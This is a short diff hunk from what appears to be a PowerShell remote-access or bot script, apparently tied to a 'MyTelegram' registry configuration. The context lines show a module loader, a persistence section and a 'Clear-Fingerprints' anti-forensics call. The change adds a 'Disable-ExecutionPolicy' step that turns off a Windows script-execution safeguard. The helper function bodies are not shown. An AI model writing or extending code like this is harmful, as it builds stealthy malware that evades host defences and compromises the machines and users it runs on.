@@ -20,6 +20,7 @@ $GLOBAL:joblist=@{}
 #if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
 Clear-Fingerprints
+Disable-ExecutionPolicy
 
 $RegKey = 'HKCU:\Software\MyTelegram'
 New-MyTelegramConfiguration
